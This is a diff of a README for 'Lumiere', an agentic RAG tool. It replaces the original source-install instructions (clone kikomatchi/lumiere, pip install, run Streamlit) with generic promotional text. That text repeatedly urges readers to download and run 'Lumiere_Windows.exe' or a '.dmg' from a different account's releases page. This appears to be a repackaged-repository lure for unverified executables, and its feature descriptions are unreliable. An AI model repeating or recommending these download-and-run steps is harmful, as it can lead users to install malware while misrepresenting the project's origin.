@@ -1,684 +1,75 @@
-# 🌟 Lumiere — Agentic RAG Knowledge Workspace
+# 🌟 Lumiere - Intelligent Document Handling Made Easy
 
-> An intelligent multi-agent system combining RAG, SQL data analysis, and semantic memory for context-aware interactions with complete observability
+## 🔗 Download Now
+[![Download Lumiere](https://img.shields.io/badge/Download%20Lumiere-v1.0-blue)](https://github.com/ILMW69/Lumiere/releases)
 
-[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![Streamlit](https://img.shields.io/badge/Streamlit-1.28+-FF4B4B.svg)](https://streamlit.io/)
-[![Qdrant](https://img.shields.io/badge/Qdrant-Cloud-6C5CE7.svg)](https://qdrant.tech/)
-[![LangChain](https://img.shields.io/badge/LangChain-🦜-00A67E.svg)](https://www.langchain.com/)
-[![LangSmith](https://img.shields.io/badge/LangSmith-Observability-FF6B6B.svg)](https://smith.langchain.com/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+## 📖 About Lumiere
+Lumiere is a smart application designed to help you manage and analyze documents with ease. It combines advanced technologies to answer your questions, analyze SQL data, and support meaningful conversations. Whether you are conducting research or simply need to manage your documents better, Lumiere makes the process quick and efficient.
 
-![Lumiere Architecture](lumiere_graph.png)
+## 🚀 Getting Started
+To get started with Lumiere, follow these simple steps to download and install the application on your computer.
 
----
+## 🛠️ System Requirements
+To run Lumiere, your system must meet the following requirements:
 
-## 🎯 Project Vision
+- **Operating System**: Windows 10 or later, macOS 10.15 or later
+- **Processor**: 1 GHz or faster
+- **RAM**: Minimum 4 GB
+- **Storage**: At least 500 MB of free space
+- **Internet Connection**: Required for downloading and certain features
 
-**Lumiere is an open-source, agentic RAG knowledge workspace that uses multi-agent reasoning, long- and short-term memory, Qdrant Cloud for vector storage, and complete observability via LangSmith.**
-
-Lumiere transforms traditional Q&A systems into an **intelligent assistant that learns and adapts** through semantic memory, supporting multiple interaction modes:
-- 📚 **RAG Mode**: Document-grounded responses with semantic search + reranking
-- 📊 **Data Analyst Mode**: SQL queries with automated visualizations
-- 💬 **General Chat**: Conversational AI with context awareness
-- 🧠 **Semantic Memory**: Long-term learning from past interactions
-- 👤 **User Isolation**: Complete data separation per user
-
----
-
-## ✨ Key Features
-
-### 🤖 9-Node Multi-Agent Architecture
-- **Intent Node**: Classifies queries, retrieves memories, and routes intelligently
-- **Retrieve Node**: Vector search with CrossEncoder reranking
-- **Reason Node**: Generates grounded RAG answers
-- **General Reason Node**: Fallback for general knowledge
-- **SQL Execute Node**: Generates and runs database queries
-- **SQL Reason Node**: Interprets SQL results
-- **Visualize Node**: Creates data visualizations (data_analyst mode)
-- **Critic Node**: Validates answer quality before storage
-- **Memory Write Node**: Stores conversations in semantic memory
-
-### 🧠 Semantic Memory System
-- **Long-term memory** stored in Qdrant Cloud vector database
-- **Automatic learning** from successful interactions
-- **Context-aware responses** using past conversations
-- **Quality filtering** via critic node (only ACCEPT decisions stored)
-- **Cross-session continuity** for personalized experiences
-- **User-specific collections** for complete data isolation
-
-### 📊 Data Analysis & Visualization
-- **Natural language to SQL** query generation
-- **Automated chart creation** (bar, line, pie, scatter, table)
-- **Interactive visualizations** with Plotly
-- **Multi-table support** with user-specific SQLite databases
-- **User isolation** - each user has separate database file
-
-### 🔍 Advanced RAG
-- **Hybrid chunking** with semantic overlap
-- **Vector similarity search** with OpenAI text-embedding-3-small
-- **CrossEncoder reranking** (ms-marco-MiniLM-L-6-v2)
-- **Metadata filtering** for precise retrieval
-- **Source attribution** for transparency
-- **Pronoun resolution** for conversational context
-- **User-specific document collections** in Qdrant Cloud
-
-### 📈 Complete Observability with LangSmith
-- **Automatic tracing** for all LangChain/LangGraph operations
-- **Zero manual instrumentation** required
-- **Full trace replay** for debugging
-- **Performance metrics** (latency, tokens, costs)
-- **Session tracking** via user_id/session_id
-- **Error monitoring** and alerting
-- **Token usage tracking** per operation
-
-### 👤 User Data Isolation
-- **Separate Qdrant collections** per user: `user_{user_id}_documents`, `user_{user_id}_memories`
-- **Separate SQLite databases** per user: `lumiere_user_{user_id}.db`
-- **Session-based user IDs** (UUID per session)
-- **Zero cross-user data leakage**
-- **Multi-tenant architecture** ready for production
-
----
-
-## 🏗️ Architecture
-
-### System Overview
-
-```
-┌─────────────┐
-│   User      │
-│  (Streamlit)│
-└──────┬──────┘
-       │
-       ▼
-┌──────────────────────────────────────────────┐
-│         LangGraph Workflow (9 Nodes)         │
-│  ┌──────────────────────────────────────┐   │
-│  │  intent → [retrieve|sql_execute|     │   │
-│  │           general_reason]             │   │
-│  │     ↓           ↓           ↓         │   │
-│  │  reason    sql_reason  general_reason│   │
-│  │     ↓           ↓           ↓         │   │
-│  │  [visualize] → critic → memory_write │   │
-│  └──────────────────────────────────────┘   │
-└───────────┬─────────────┬────────────────────┘
-            │             │
-    ┌───────▼─────┐   ┌──▼────────────┐
-    │ Qdrant Cloud│   │  SQLite (per  │
-    │ (per user)  │   │    user)      │
-    │  - docs     │   │  - tables     │
-    │  - memories │   │  - sessions   │
-    └─────────────┘   └───────────────┘
-           │
-    ┌──────▼─────────┐
-    │   LangSmith    │
-    │  (Automatic    │
-    │   Tracing)     │
-    └────────────────┘
-```
-
-### Workflow Paths
-
-1. **RAG Query Path**
-   ```
-   intent (needs_rag) → retrieve → reason → critic → memory_write → END
-   ```
-
-2. **SQL/Data Analysis Path**
-   ```
-   intent (needs_sql) → sql_execute → sql_reason → [visualize] → critic → memory_write → END
-   ```
-
-3. **General Chat Path**
-   ```
-   intent → general_reason → critic → memory_write → END
-   ```
-
-See [GRAPH_ARCHITECTURE.md](docs/GRAPH_ARCHITECTURE.md) for detailed workflow documentation or view `lumiere_graph.png` for visual representation.
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- Python 3.11+
-- Qdrant (running locally or cloud)
-- OpenAI API key
-- Langfuse account (optional, for observability)
-
-### Installation
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/kikomatchi/lumiere.git
-   cd lumiere
-   ```
-
-2. **Create virtual environment**
-   ```bash
-   python -m venv venv
-   source venv/bin/activate  # On Windows: venv\Scripts\activate
-   ```
-
-3. **Install dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-4. **Set up environment variables**
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click [here](https://github.com/ILMW69/Lumiere/releases) to access the releases page.
    
-   Create a `.env` file in the project root:
-   ```env
-   # OpenAI API
-   OPENAI_API_KEY=your_openai_api_key_here
-   
-   # Qdrant Configuration (Cloud or Local)
-   QDRANT_URL=https://your-cluster.qdrant.io  # Or http://localhost:6333
-   QDRANT_API_KEY=your_qdrant_api_key  # Required for Qdrant Cloud
-   
-   # LangSmith Observability (Optional)
-   LANGCHAIN_TRACING_V2=true
-   LANGCHAIN_API_KEY=your_langsmith_api_key
-   LANGCHAIN_PROJECT=Lumiere
-   LANGCHAIN_ENDPOINT=https://api.smith.langchain.com
-   ```
+2. **Choose the Latest Version**: Look for the version labeled as the latest release. For example, if it says "v1.0", click on that link.
 
-5. **Start Qdrant** (if running locally, skip if using Qdrant Cloud)
-   ```bash
-   docker run -p 6333:6333 -p 6334:6334 \
-       -v $(pwd)/qdrant_storage:/qdrant/storage:z \
-       qdrant/qdrant
-   ```
+3. **Download the Application**: 
+   - Find the file suitable for your operating system (e.g., `Lumiere_Windows.exe` for Windows users or `Lumiere_macOS.dmg` for macOS users).
+   - Click on the link to download the file to your computer.
 
-6. **User collections auto-created**
-   - No manual initialization needed!
-   - Collections created automatically on first upload/query per user
-   - Format: `user_{user_id}_documents`, `user_{user_id}_memories`
+4. **Run the Installer**: 
+   - For Windows, double-click the `.exe` file you downloaded and follow the on-screen instructions.
+   - For macOS, open the `.dmg` file and drag the Lumiere app into your Applications folder.
 
-7. **Launch Lumiere**
-   python scripts/init_semantic_memory.py
-   ```
+5. **Launch Lumiere**: After installation, you can find Lumiere in your applications and start using it right away.
 
-8. **Run the application**
-   ```bash
-   streamlit run app.py
-   ```
+## 🎓 Using Lumiere
+Lumiere offers a user-friendly interface that allows you to take full advantage of its features. Here’s how to navigate:
 
-9. **Open your browser**
-   
-   Navigate to `http://localhost:8501`
+### 📄 Documents
+You can easily upload multiple documents, and Lumiere will analyze them for insights. You can ask questions, and it will provide you with answers based on the documents.
 
----
+### 🔍 Data Analysis
+For SQL users, Lumiere helps you analyze your data. You can type your SQL queries directly into the application, and it will assist you by suggesting optimizations or providing results you need. 
 
-## 📖 Usage Guide
+### 💬 Conversations
+Lumiere can engage in context-aware conversations. You can ask questions not only about the loaded documents but also about other relevant topics, making it an excellent assistant.
 
-### 1. Ingesting Documents
+### 💡 Long-term Learning
+The system retains knowledge over time. This means that the more you interact with Lumiere, the better it understands your preferences.
 
-**Via Streamlit UI:**
-1. Click "📄 Document Ingestion" in sidebar
-2. Upload PDF, TXT, or MD files
-3. Click "Ingest Documents"
-4. Wait for confirmation
+## ⚙️ Features
+- **Smart Document Q&A**: Instant responses based on uploaded documents.
+- **SQL Data Analysis**: Easy management of SQL queries and analysis.
+- **Context-Aware Conversations**: Meaningful dialogues based on ongoing topics.
+- **Critic Validation**: Receive feedback on the quality and accuracy of responses.
+- **Full Observability**: Monitor how the system learns and evolves.
 
-**Via Script:**
-```bash
-python -c "from rag.ingest import ingest_directory; ingest_directory('path/to/docs')"
-```
+## 🌐 Support and Community
+If you encounter issues or have questions about using Lumiere, several resources are available for support:
 
-### 2. Asking Questions
+- **GitHub Issues**: Report bugs or request features directly in the [Issues section](https://github.com/ILMW69/Lumiere/issues).
+- **User Guides**: Follow detailed user guides available in the repository to explore more features.
+- **Community Discussions**: Join our community on platforms like Discord or Reddit to connect with other users.
 
-#### RAG Queries (Document-based)
-```
-"What is FFXIV?"
-"Explain vector databases"
-"How does semantic search work?"
-```
+## 📝 Contribution
+If you are interested in contributing to Lumiere, we welcome your input. You can fork the repository, make changes, and submit a pull request for review. Detailed contribution guidelines are available in the repository.
 
-#### Data Analysis Queries
-```
-"Show me the top 5 products by sales"
-"How many hybrid cars are in the database?"
-"What is the average price by manufacturer?"
-```
+## 🔒 License
+Lumiere is open-source software licensed under the MIT License. You can freely use, modify, and share it.
 
-#### General Chat
-```
-"Hello, how are you?"
-"Can you help me with my project?"
-"What can you do?"
-```
+## 📬 Feedback
+Your feedback is important to us. Please reach out through GitHub or mention any ideas for improvement. We aim to make Lumiere better for everyone.
 
-### 3. Viewing Semantic Memory
-
-**In Streamlit:**
-1. Expand "🧠 Semantic Memory" in sidebar
-2. View total memories and types
-3. Search memories by keyword
-4. See relevance scores and timestamps
-
-**Via Python:**
-```python
-from memory.semantic_memory import get_memory_stats, retrieve_memories
-
-# Get statistics
-stats = get_memory_stats()
-print(stats)
-
-# Search memories
-memories = retrieve_memories(
-    query="database queries",
-    top_k=5,
-    user_id="user123",
-    min_score=0.7
-)
-```
-
-### 4. Switching Modes
-
-Use the sidebar to select:
-- **All In**: All features enabled (default)
-- **Chat + RAG**: Document Q&A only
-- **Data Analyst**: SQL queries + visualizations
-
----
-
-## 🗂️ Project Structure
-
-```
-Lumiere/
-├── agents/                    # Agent implementations
-│   ├── intent_agent.py       # Intent classification + memory retrieval
-│   ├── reasoning_agent.py    # RAG reasoning
-│   ├── sql_agent.py          # SQL generation & execution
-│   ├── critic_agent.py       # Quality validation
-│   └── viz_agent.py          # Visualization generation
-│
-├── graph/                     # LangGraph workflow
-│   ├── rag_graph.py          # Main graph definition
-│   └── state.py              # State management
-│
-├── memory/                    # Semantic memory system
-│   └── semantic_memory.py    # Vector-based memory storage/retrieval
-│
-├── rag/                       # RAG components
-│   ├── chunking.py           # Document chunking strategies
-│   ├── collections.py        # Qdrant collection management
-│   ├── embeddings.py         # OpenAI embeddings wrapper
-│   ├── ingest.py             # Document ingestion pipeline
-│   ├── qdrant_client.py      # Qdrant client singleton
-│   └── retriever.py          # Semantic search & filtering
-│
-├── database/                  # Data storage
-│   └── sqlite_client.py      # SQLite connection & queries
-│
-├── config/                    # Configuration
-│   └── settings.py           # Environment & settings
-│
-├── scripts/                   # Utility scripts
-│   ├── init_semantic_memory.py   # Initialize memory system
-│   ├── ingest_test.py            # Test document ingestion
-│   └── retrieval_test.py         # Test retrieval
-│
-├── ui/                        # Streamlit components
-│   └── (UI modules)
-│
-├── app.py                     # Main Streamlit application
-├── requirements.txt           # Python dependencies
-├── graph_visualization.mmd    # Mermaid diagram
-├── graph_visualization.png    # Architecture diagram
-├── GRAPH_ARCHITECTURE.md      # Detailed architecture docs
-├── SEMANTIC_MEMORY.md         # Memory system documentation
-└── README.md                  # This file
-```
-
----
-
-## 🧠 Semantic Memory System
-
-### How It Works
-
-1. **Storage**: Every accepted conversation is embedded and stored in Qdrant
-   - Uses OpenAI `text-embedding-3-small` (1536 dimensions)
-   - Includes query, response, mode, and metadata
-   - Quality-filtered by critic agent (only ACCEPT decisions)
-
-2. **Retrieval**: Intent agent retrieves relevant memories before processing
-   - Top-k semantic search with cosine similarity
-   - Configurable threshold (default: 0.75)
-   - Formatted context injected into agent prompts
-
-3. **Benefits**:
-   - **Personalization**: Remembers user preferences
-   - **Context**: Understands conversation history
-   - **Learning**: Improves responses over time
-   - **Continuity**: Works across sessions
-
-### Memory Types
-
-- `conversation`: General Q&A interactions
-- `preference`: User preferences (e.g., "I prefer bar charts")
-- `fact`: User-declared facts (e.g., "I'm working on X project")
-- `pattern`: Common query patterns
-- `error_resolution`: Problem-solving history
-
-### Example
-
-**First interaction:**
-```
-User: "Show me sales data as a bar chart"
-Assistant: [Generates bar chart]
-💾 Stores: User prefers bar charts for sales data
-```
-
-**Later interaction:**
-```
-User: "Show me revenue trends"
-Assistant: [Retrieves memory about chart preference]
-           [Automatically generates bar chart]
-```
-
-See [SEMANTIC_MEMORY.md](docs/SEMANTIC_MEMORY.md) for detailed documentation.
-
----
-
-## 📊 Data Analyst Mode
-
-### Features
-
-- **Natural language to SQL**: Generate queries from plain English
-- **Automated visualizations**: Smart chart type selection
-- **Interactive charts**: Plotly-based visualizations
-- **Result interpretation**: Natural language summaries
-
-### Supported Chart Types
-
-- **Bar Chart**: Comparisons, rankings
-- **Line Chart**: Trends over time
-- **Pie Chart**: Proportions, distributions
-- **Scatter Plot**: Correlations, relationships
-
-### Example Queries
-
-```
-"Show me sales by region"
-→ SQL: SELECT region, SUM(sales) FROM sales GROUP BY region
-→ Chart: Bar chart with regions on x-axis
-
-"How have prices changed over time?"
-→ SQL: SELECT date, AVG(price) FROM products GROUP BY date
-→ Chart: Line chart showing price trends
-
-"What's the distribution of car types?"
-→ SQL: SELECT type, COUNT(*) FROM cars GROUP BY type
-→ Chart: Pie chart showing proportions
-```
-
----
-
-## 🔍 Advanced RAG Features
-
-### Chunking Strategies
-
-- **Semantic chunking**: Split by meaning, not just length
-- **Overlap**: Maintains context between chunks
-- **Metadata preservation**: Source, page numbers, timestamps
-
-### Retrieval Options
-
-- **Hybrid search**: Combines semantic + keyword search
-- **Metadata filtering**: Filter by source, date, type
-- **Reranking**: Re-scores results for relevance
-- **Source attribution**: Shows where answers come from
-
-### Document Support
-
-- **PDF**: Automatic text extraction
-- **TXT**: Plain text files
-- **Markdown**: Preserves formatting
-- **Batch ingestion**: Process entire directories
-
----
-
-## 🎛️ Configuration
-
-### Key Settings (config/settings.py)
-
-```python
-# Model Configuration
-OPENAI_MODEL = "gpt-4o-mini"
-EMBEDDING_MODEL = "text-embedding-3-small"
-EMBEDDING_DIMENSIONS = 1536
-
-# Retrieval Settings
-TOP_K_RETRIEVAL = 3
-MIN_SIMILARITY_SCORE = 0.7
-
-# Memory Settings
-MEMORY_TOP_K = 3
-MEMORY_MIN_SCORE = 0.75
-
-# Chunking
-CHUNK_SIZE = 1000
-CHUNK_OVERLAP = 200
-```
-
-### Environment Variables
-
-See `.env.example` for all available configuration options.
-
----
-
-## 🐛 Troubleshooting
-
-### Common Issues
-
-**1. Qdrant Connection Error**
-```
-Error: Cannot connect to Qdrant
-```
-**Solution**: Ensure Qdrant is running on `localhost:6333`
-```bash
-docker ps | grep qdrant  # Check if running
-```
-
-**2. OpenAI API Error**
-```
-Error: Invalid API key
-```
-**Solution**: Check `.env` file has correct `OPENAI_API_KEY`
-
-**3. No Memories Stored**
-```
-Memory count remains at 3
-```
-**Solution**: 
-- Check critic is accepting answers (look for ✅ in terminal)
-- Ensure Qdrant collection exists
-- Verify semantic memory is enabled
-
-**4. Import Errors**
-```
-ModuleNotFoundError: No module named 'X'
-```
-**Solution**: Reinstall dependencies
-```bash
-pip install -r requirements.txt
-```
-
-### Debug Mode
-
-Enable detailed logging:
-```python
-# In config/settings.py
-DEBUG_MODE = True
-```
-
-Look for these debug indicators in terminal:
-- 💾 Memory Write Node
-- ✅ Stored semantic memory
-- ⏭️ Skipping memory storage
-- 📦 Retrieval node
-- 🔍 Query analysis
-
----
-
-## 📈 Observability
-
-### Langfuse Integration
-
-Lumiere integrates with Langfuse for comprehensive observability:
-
-1. **Traces**: Full request lifecycle tracking
-2. **Token usage**: Cost monitoring per operation
-3. **Latency**: Performance metrics
-4. **Agent behavior**: Decision tracking
-
-**Setup:**
-1. Create account at [langfuse.com](https://langfuse.com)
-2. Add keys to `.env`
-3. View traces in Langfuse dashboard
-
-### Memory Statistics
-
-View memory stats in terminal:
-```bash
-python -c "from memory.semantic_memory import get_memory_stats; import json; print(json.dumps(get_memory_stats(), indent=2))"
-```
-
-Example output:
-```json
-{
-  "total_memories": 15,
-  "vector_size": 1536,
-  "memory_types": {
-    "conversation": 10,
-    "preference": 3,
-    "fact": 1,
-    "pattern": 1
-  }
-}
-```
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our contributing guidelines.
-
-### Development Setup
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
-
-### Code Style
-
-- Follow PEP 8
-- Use type hints
-- Add docstrings to functions
-- Keep functions focused and small
-
----
-
-## 📝 Documentation
-
-Full documentation is available in the [`docs/`](docs/) folder:
-
-- **[Quick Start Guide](docs/QUICKSTART.md)**: Get up and running in 5 minutes
-- **[Architecture Guide](docs/GRAPH_ARCHITECTURE.md)**: Detailed workflow documentation
-- **[Semantic Memory Guide](docs/SEMANTIC_MEMORY.md)**: Memory system documentation
-- **[Contributing Guide](docs/CONTRIBUTING.md)**: How to contribute
-- **[Changelog](docs/CHANGELOG.md)**: Version history and updates
-- **[Documentation Index](docs/DOCUMENTATION.md)**: Complete documentation overview
-
-## 🧪 Testing
-
-Comprehensive test suite with 34 tests covering core functionality:
-
-```bash
-# Run all tests
-pytest
-
-# Run with coverage
-pytest --cov=. --cov-report=html
-
-# Run specific test file
-pytest tests/test_semantic_memory.py
-```
-
-**Test Coverage:**
-- ✅ Semantic Memory (9 tests)
-- ✅ Intent Agent (6 tests)
-- ✅ Graph Workflow (10 tests)
-- ✅ RAG Components (10 tests)
-
-See [`tests/README.md`](tests/README.md) for complete testing guide and [`TEST_SETUP_SUMMARY.md`](TEST_SETUP_SUMMARY.md) for current status.
-
----
-
-## 🗺️ Roadmap
-
-### Current Features ✅
-- Multi-agent RAG system
-- Semantic memory integration
-- SQL data analysis
-- Automated visualizations
-- Critic-based quality control
-- Langfuse observability
-
-### Coming Soon 🚧
-- [ ] Multi-user support with user isolation
-- [ ] Memory pruning and consolidation
-- [ ] Advanced query routing
-- [ ] Custom embedding models
-- [ ] API endpoints (REST/GraphQL)
-- [ ] Memory analytics dashboard
-- [ ] Feedback loop for memory refinement
-
-### Future Vision 🔮
-- [ ] Multi-modal support (images, audio)
-- [ ] Agent collaboration framework
-- [ ] Distributed memory architecture
-- [ ] Real-time streaming responses
-- [ ] Plugin system for extensibility
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-Built with:
-- [LangChain](https://www.langchain.com/) - LLM framework
-- [LangGraph](https://langchain-ai.github.io/langgraph/) - Agent orchestration
-- [Qdrant](https://qdrant.tech/) - Vector database
-- [Streamlit](https://streamlit.io/) - UI framework
-- [OpenAI](https://openai.com/) - LLM & embeddings
-- [Langfuse](https://langfuse.com/) - Observability
-
----
-
-## 📧 Contact
-
-For questions, issues, or feedback:
-- Open an issue on GitHub
-- Check existing documentation
-- Review troubleshooting section
-
----
-
-## ⭐ Star History
-
-If you find Lumiere useful, please consider giving it a star! ⭐
-
----
-
-**Made with ❤️ for the AI community**
+## 🔗 Download Now Again
+Don't forget to visit the releases page to download Lumiere. Click [here](https://github.com/ILMW69/Lumiere/releases) for the latest version.
